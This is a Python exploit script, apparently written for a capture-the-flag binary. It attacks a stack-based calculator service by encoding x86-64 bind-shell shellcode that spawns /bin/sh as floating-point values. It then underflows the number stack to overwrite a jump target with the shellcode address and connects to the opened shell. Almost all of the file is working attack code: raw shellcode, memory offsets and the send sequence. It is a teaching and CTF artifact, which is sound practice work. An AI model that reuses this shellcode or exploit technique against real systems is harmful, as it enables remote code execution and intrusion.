import random
import sys
import struct
import subprocess
sys.path.append('/Users/lucas/ctf/tools')

import ctf

'''
commands:

b - pop stack
c - clear stack
q - quit
. - peek stack
0-9
+
-
*
/
!

'''


'''
input struct_format
[0x0] double (if number)
[0x8] 1 == number, 2==string
[0xC] 0x100 Byte buf (filled by strncpy n=0x100)
[0x10C] END

jump table works like this:

if (ord(char)-ord('!')) < 0x50
jmp (0x401a44 + (ord(char)-ord('!')*4))

number_stack
[0] # of items (can go negative)
[8] start of data
'''

shell_port = random.randint(1111, 2**16-1)

shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + \
            "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + \
            "\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02" + \
            struct.pack('>H', shell_port) + \
            "\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05" + \
            "\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31" + \
            "\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59" + \
            "\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48" + \
            "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + \
            "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + \
            "\x5f\x6a\x3b\x58\x0f\x05"

def buf_to_double(buf):
    # The python struct module doesn't have enough precision to convert
    # the buffers
    result = subprocess.check_output(['./buf_to_double',buf])
    return result.split('\n')

number_stack_data_start = 0x603150
qwords_to_send = 0x1d

HOST = '192.168.221.128'
PORT = 31415

def main():
    s = ctf.connect(HOST,PORT)

    padded_shellcode = shellcode + ('\x90' * (8-(len(shellcode)%8)))
    double_shellcode = buf_to_double(padded_shellcode)
    double_shellcode = [str(c) for c in double_shellcode]

    # This will work fine for small numbers (ie < 4 Bytes)
    shellcode_location = struct.unpack('d', struct.pack('Q',number_stack_data_start))[0]
    shellcode_location = str(shellcode_location)

    # Write the shellcode into the number_stack
    for double in double_shellcode:
        if double:
            ctf.send(s, double + '\n')

    # Back up to the base
    ctf.send(s, 'c\n')
    ctf.recv(s)

    # Back up to send in the plt
    for i in range(0, qwords_to_send):
        ctf.send(s, 'b\n')
        ctf.recv(s)

    # Write the address of the shellcode
    ctf.send(s, shellcode_location + '\n')

    # Send a bad opcode to trigger send()
    ctf.send(s, 'm\n')

    s.close()

    ctf.shell(HOST, shell_port)
    
if __name__ == '__main__':
    main()
